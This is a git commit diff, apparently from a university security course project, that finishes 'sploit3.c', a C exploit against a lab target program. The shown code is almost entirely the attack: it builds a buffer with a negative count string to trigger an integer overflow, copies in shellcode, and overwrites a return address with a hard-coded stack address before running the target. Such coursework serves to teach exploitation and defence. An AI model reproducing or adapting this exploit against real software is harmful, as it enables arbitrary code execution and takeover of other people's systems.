51d70cf4886b5cd53eff388ec0f52c228c15b4a7
Bryan Cheng <bryan.b.cheng@gmail.com>
2014-04-07 09:06:31 +0000

    finished sploit3

--- proj1/sploits/sploit3.c
+++ proj1/sploits/sploit3.c
@@ -12,16 +12,16 @@ int main(void)
   char *env[1];
 
   // (4294967295 / 20) - 1000
-  char *count = "-214747365";
+  char *count = "-214747364";
   int len = strlen(count) + 1 + 20016;
   char exploit[len];
   memset(exploit, 0xff, len);
   memcpy(exploit, count, strlen(count));
   exploit[strlen(count)] = ',';
-  memcpy(exploit + strlen(count) + 1, shellcode, sizeof(shellcode));
+  memcpy(exploit + strlen(count) + 1, shellcode, sizeof(shellcode) - 1);
 
-  int *ret = (int *)(exploit + 20004);
-  *ret = 0xbfffaff8;
+  int *ret = (int *)(exploit + strlen(count) + 1 + 20004);
+  *ret = 0xbfff61f8;
 
   args[0] = TARGET; args[1] = exploit; args[2] = NULL;
   env[0] = NULL;
